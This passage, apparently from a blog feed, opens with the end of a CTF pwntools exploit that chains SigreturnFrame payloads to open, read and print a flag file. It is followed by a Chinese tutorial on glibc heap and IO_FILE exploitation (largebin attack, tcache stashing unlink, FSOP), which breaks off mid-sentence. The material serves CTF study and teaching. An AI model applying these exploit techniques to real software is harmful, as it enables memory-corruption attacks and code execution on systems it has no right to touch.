class="number">0</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x1000</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x10</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">2</span></span><br><span class="line">sig.rsi = buf</span><br><span class="line">sig.rdx = <span class="number">0</span></span><br><span class="line">sig.rcx = <span class="number">0</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x120</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x120</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x120</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">3</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x240</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x240</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">1</span></span><br><span class="line">sig.rsi = <span class="number">1</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOFILE exploit</title>
      <link href="/IOFILE-exploit/"/>
      <url>/IOFILE-exploit/</url>
      
        <content type="html"><![CDATA[<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>前段时间给人讲课，碰上了高版本glibc堆利用这部分。刚好自己啥也不会，于是花了些时间好好学了下IOFILE在高版本下的利用。好在最后没有翻车，自己在备课期间也独立完成了一些经典例题，算是有了一些粗浅的收获。现以一个初学者的目光重新梳理学习IOFILE利用的整个过程。</p><h1 id="辅助手法"><a href="#辅助手法" class="headerlink" title="辅助手法"></a>辅助手法</h1><p>IOFILE的利用，通常需要伪造IOFILE结构体，随后通过一些方式触发IO流，使得程序调用我们劫持后的IO函数，从而达成getshell或者orw。所以IOFILE exploit实际上是整个利用环节的<strong>最后一步</strong>，要达成伪造IOFILE结构体、触发IO链，往往需要借助一些<strong>辅助手法</strong>。</p><p>在高版本下，最为常用的是<strong>largebin attack</strong>，该手法需要一个UAF，达成后能在任意目标地址写上堆地址，简单暴力，用过都说好。还有<strong>tcache poisoning</strong>，用来分配到任意地址上。还有一种是<strong>tcache stashing unlink</strong>，该手法在house of pig中被使用，要求程序使用calloc，并存在UAF，通常结合largebin attack达成将目标地址分配为chunk。</p><h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><blockquote><p>原先存在两条利用链，其中一条在高版本下已被封禁，查找资料时需甄别。</p></blockquote><p>首先我们需要了解largebin的结构：</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811162248700.png" alt="image-20230811162248700"></p><p>一个large bin中包含<strong>一定范围大小</strong>的large chunk，如第一个largebin大小范围为(0x400-0x430)，第二个为(0x440-0x470)。同一个bin中，相同大小的chunk之间用<code>fd</code>、<code>bk</code>相连，不同大小用<code>fd_nextsize</code>、<code>bk_nextsize</code>相连，且自动由大到小排序，如上图中左边的大于右边。</p><p>当有新的chunk加入largebin，且大小小于该bin中已有的chunk时，会进行如下操作（精简版）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line"><span class="comment">/*查找该size属于的bin范围，返回index*/</span></span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line"><span class="comment">/*取得bin*/</span></span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//critical1!!!</span></span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//critical2!!!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该操作实际上完成了一个简单的将chunk加入双向链表的过程，可以逐步手动模拟加深理解</p><p>该操作缺失对双向链表完整性的检查，可以加以利用</p><p>我们假设largebin中仅存在chunk0，现在准备将chunk1加入largebin，且chunk0 &gt; chunk1。我们把chunk0的<code>bk_nextsize</code>修改为<code>[target-0x20]</code>(即<code>target</code>目标地址位于以<code>[target-0x20]</code>开头的chunk的<code>fd_nextsize</code>处)</p><p>修改完成后，我们将chunk1入链，重点关注上述代码片段中注释的部分。critical1处 <code>victim-&gt;bk_nextsize = (&amp;target)-4)</code>，critical2处 <code>(&amp;target)-4)-&gt;fd_nextsize = victim</code>，即<code>*target = victim</code>。目标达成</p><p>由此可见，largebin attack的利用相当简单，只需一个UAF即可完</p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>忘写了XD</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>glibc加入tcache后，当从smallbin中取出chunk时，如果smallbin中仍有chunk且对应tcache未填满，则会将smallbin中剩余chunk全部依次放入对应tcache中。而在该过程中，只对从smallbin中取出的chunk进行了完整性检查，后续chunk均没有。该手法则利用了这一漏洞。</p><p>以下为将smallbin中chunk放入tcache的代码片段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="comment">//只对第一个chunk进行了完整性检查，后面进入循环，无检查</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">bck = tc_victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"><span class="comment">//将其放入到Tcache中</span></span><br><span class="line">tcache_put (tc_victim, tc_idx);</span><br></pre></td></tr></table></figure><p>假设smallbin中只存在两个chunk，先入的为chunk0，后入的为chunk1，根据smallbin的<strong>FIFO</strong>原则，取出时先取出chunk0</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811170105495.png" alt="image-20230811170105495"></p><p>同时令对应大小的tcache中已填入5个chunk</p><p>此时将chunk1的<code>bk</code>位修改为目标地址<code>target</code>（不破坏<code>fd</code>），并利用其他手法使得<code>[target+0x8]</code>处为一个指向<strong>可写内存</strong>的指针。把<code>target</code>看作一个chunk的用户指针，则<code>[target+0x8]</code>为<code>bk</code>位。此处令其可写是因为进行该攻击时会向该指针指向的地址处写一个值，如果不可写的话程序会报错。用largebin attack将此处覆盖为可写的堆地址是一种常见操作</p><p>此时，我们用<code>calloc</code>函数将chunk0申请出来。<code>calloc</code>具有跳过tcache申请chunk的性质，所以此处只能用<code>calloc</code>。之后chunk1会加入tcache，chunk1的bk指向的<code>target</code>也会加入tcache。如果我们使用<code>malloc</code>，根据tcache <strong>LIFO</strong>的性质，就能将<code>target</code>申请出来。</p><h1 id="IOFILE及相关结构"><a href="#IOFILE及相关结构" class="headerlink" title="IOFILE及相关结构"></a>IOFILE及相关结构</h1><h2 id="IO-FILE-PLUS"><a href="#IO-FILE-PLUS" class="headerlink" title="_IO_FILE_PLUS"></a>_IO_FILE_PLUS</h2><p>程序在进行<strong>IO操作</strong>时，会用到IOFILE相关的结构。例如众所周知的<code>stdin</code>、<code>stdout</code>、<code>stderr</code>，都是指向IO结构体的指针。当打开一个文件时，程序需要记录文件的输入输出缓冲区等内容，于是需要一个<code>_IO_FILE</code>结构体进行记录。除此之外，对文件进行的各种操作形成了一张张函数虚表，文件需要一个指针记录对应的函数虚表，该指针被定义为<code>_IO_jump_t</code>类型。<code>_IO_FILE</code> 结构体和虚表指针<code>_IO_jump_t</code>形成了一个称为<code>_IO_FILE_plus</code>的结构体，它的定义是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>常见的<code>_IO_FILE_plus</code>结构体有<code>_IO_2_1_stderr</code>、<code>_IO_2_1_stdout</code>、<code>_IO_2_1_stdin</code>，前面提到的<code>stdin</code>等就是指向这些对应<code>_IO_FILE_plus</code>结构体的指针</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811172846782.png" alt="image-20230811172846782"></p><p>可以通过gdb的<code>p</code>指令查看</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173045845.png" alt="image-20230811173045845"></p><p>此外，存在一个指向<code>_IO_FILE_plus</code>结构体的<code>_IO_list_all</code>指针，通常情况下指向<code>_IO_2_1_stderr</code></p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173332086.png" alt="image-20230811173332086"></p><p>每个<code>_IO_FILE</code>结构体中都存在一个<code>_chain</code>指针，指向下一个<code>_IO_FILE_plus</code>结构体。通常情况，表示如下：</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173606405.png" alt="image-20230811173606405"></p><p>当有新文件被打开时，对应的<code>_IO_FILE_plus</code>结构体就会被插入到<strong>链首</strong>。</p><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p>以下是<code>_IO_FILE</code>结构体的源码，看起来可能有些头大，重点需要了解的是几个<strong>缓冲区的指针</strong>、<code>_chain</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic</span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments.</span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE_complete</code>可以理解为<code>_IO_FILE</code>的豪华加长版，其中的<code>_wide_data</code>需要关注一下，有些手法会用到。</p><h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><p><code>vtable</code>是一个指向<code>_IO_jump_t</code>结构体的指针。当打开一个文件时，相应的 <code>_IO_FILE</code> 结构体会被创建，并将其<code> vtable</code> 字段指向对应文件类型的 <code>_IO_jump_t</code> 结构体的地址。这样，当需要执行文件操作时，可以通过 <code>_IO_FILE</code> 结构体中的 <code>vtable</code> 字段获取到相应的 <code>_IO_jump_t</code> 结构体，并通过其中的函数指针调用相应的文件操作函数。</p><p>通常，一个<code>_IO_jump_t</code> 结构体包含以下函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意，程序中存在很多<code>_IO_jump_t</code>结构体，不同的<code>_IO_FILE_plus</code>可能采用不同的<code>_IO_jump_t</code>，例如stdin&#x2F;stdout&#x2F;stderr使用<code>_IO_file_jumps</code>，可以通过gdb查看</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811182023451.png" alt="image-20230811182023451"></p><h1 id="FSOP基础"><a href="#FSOP基础" class="headerlink" title="FSOP基础"></a>FSOP基础</h1><p><strong>FSOP</strong>(File Stream Oriented Programming是针对<code>_IO_FILE</code>结构体与IO操作的攻击方式</p><p>通常可以分为两个步骤：<strong>劫持</strong>并<strong>伪造</strong>IO结构体、<strong>触发</strong>IO流</p><p>因为触发IO流的方式影响程序进入的IO结构体，所以我们先讲如何触发IO流</p><h2 id="触发IO流"><a href="#触发IO流" class="headerlink" title="触发IO流"></a>触发IO流</h2><p>触发IO流的方式主要分为两种：<strong>FSOP</strong>的经典方式和<strong>house of kiwi</strong>的方式</p><h3 id="FSOP-IO-flush-all-lockp"><a href="#FSOP-IO-flush-all-lockp" class="headerlink" title="FSOP - _IO_flush_all_lockp()"></a>FSOP - _IO_flush_all_lockp()</h3><p>该函数的调用有以下三种触发方式：</p><ol><li><code>libc</code>检测到<strong>内存错误</strong>，从而执行<code>abort</code>函数时（在<code>glibc-2.26</code>删除）</li><li>程序执行<code>exit</code>函数</li><li>程序从main函数返回（同样是执行exit）</li></ol><p>可以看到，高版本下，基本的触发方式都是通过<code>exit</code>函数，其栈回溯为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br></pre></td></tr></table></figure><p>就能调用到<code>_IO_flush_all_lockp()</code>函数</p><p>该函数的代码片段如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"> </span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"> </span><br><span class="line">    fp = fp-&gt;_chain; <span class="comment">//遍历链表</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在经历一系列条件判断后，程序会调用虚表中的<code>_IO_OVERFLOW</code> 函数，而虚表指针是可以由我们伪造的。所以合理布局，触发该函数，就能进入我们伪造的执行流。</p><p>下面讲如何达成调用<code>_IO_OVERFLOW</code>函数的条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>根据短路原则，执行<code>_IO_OVERFLOW</code>需要满足前面的条件为真，这里有一个或语句，故有两种达成条件，满足任一即可：</p><p>1.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><p>   这是较为常用的达成条件，只需伪造<code>_IO_FILE</code>中的<code>_IO_write_ptr</code>、<code>_IO_write_base</code>和<code>_mode</code>即可达成</p><p>2.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">fp-&gt;_mode &gt; <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><p>   该条件可以结合<strong>house of 